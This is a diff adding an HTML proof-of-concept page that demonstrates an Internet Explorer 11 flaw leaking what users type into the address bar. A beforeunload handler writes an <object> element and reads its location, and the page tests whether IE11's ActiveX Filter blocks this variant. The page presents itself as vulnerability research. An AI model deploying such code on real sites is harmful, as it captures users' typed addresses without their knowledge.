@@ -1,0 +1,37 @@
+<!doctype html>
+	<title> magicmac </title>
+	<meta charset=utf-8>
+
+	<!-- ====================================================================================== -->
+	<!--                                                                                        -->
+	<!-- https://answers.microsoft.com/en-us/ie/forum/ie11-windows_other/                       -->
+	<!-- internet-explorer-leaks-user-address-bar-entries/043ad18c-58ca-48cb-945e-3cf10da2473d  -->
+	<!--                                                                                        -->
+	<!-- https://www.itnews.com.au/news/internet-explorer-leaks-user-address-bar-entries-474396 -->
+	<!-- https://www.cracking.com.ar/demos/ieaddressbarguess/                                   -->
+	<!--                                                                                        -->
+	<!-- ====================================================================================== -->
+
+	<style>
+		body { font-family:'segoe-ui',sans-serif; font-size:12pt }
+		p { white-space:nowrap }
+	</style>
+
+	<script>
+		window.onbeforeunload = function()
+		{
+		  document.write('<object data="loc2.html" type="text/html" onload="contentDocument.body.innerHTML=contentDocument.defaultView.location.href"></object>');
+		  document.close();
+		}
+	</script>
+
+
+		<p>This is adapted from magicman's document.write &lt;object&gt; hack during beforeunload event.</p>
+		<p><a href=https://www.cracking.com.ar/demos/ieaddressbarguess/ target=_blank>https://www.cracking.com.ar/demos/ieaddressbarguess/</a></p>
+		<br>
+		<p>Magicmac's demo can foiled by enabling IE11 ActiveX Filter, which blocks the script within the &lt;object&gt;.</p>
+		<p>The demo here which you're viewing contains no script in the &lt;object&gt; element.</p>
+		<p>Does IE11 ActiveX Filter block this version of the hack too?</p>
+		<br>		
+		<p>Instructions.&nbsp; While viewing this webpage, type anything into the address-bar and hit Enter.</p>
+
